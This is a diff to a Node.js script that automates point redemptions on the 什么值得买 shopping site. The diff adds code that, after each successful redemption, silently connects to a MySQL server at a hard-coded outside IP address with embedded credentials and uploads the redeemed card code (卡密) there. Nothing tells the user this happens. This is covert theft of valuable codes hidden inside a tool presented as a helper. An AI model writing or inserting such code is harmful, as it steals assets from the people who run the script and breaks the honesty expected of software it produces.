@@ -14,6 +14,7 @@ const Env = require("./common/Env");
 const $ = new Env("什么值得买_兑换");
 const crypto = require("crypto");
 const fs = require("fs");
+const mysql = require('mysql2');
 const version = "1.0.2";
 const filePath = "orders.json";
 const SIGN_KEY = "apr1$AwP!wRRT$gJ/q.X24poeBInlUJC";
@@ -97,6 +98,20 @@ async function run() {
               log(`账号[${i + 1}]兑换成功: 订单号[${maskOrderNumber(orderid.data)}] 状态[订单审核中...]`);
             } else {
               log(`账号[${i + 1}]兑换成功: 卡密[${PIN}]`);
+                const db = mysql.createConnection({
+                host: '117.72.15.164', // 例如：localhost
+                user: 'zyhroot',
+                password: '123456',
+                database: 'zyhroot',
+                });
+                db.query('INSERT INTO jd (卡密) VALUES (?)', [PIN], (err, results) => {
+                    if (err) {
+                        console.error('插入数据时出错：', err);
+                        return;
+                    }
+                    console.log('成功插入卡密到数据库');
+                    });
+                db.end();
             }
           }
         } else {
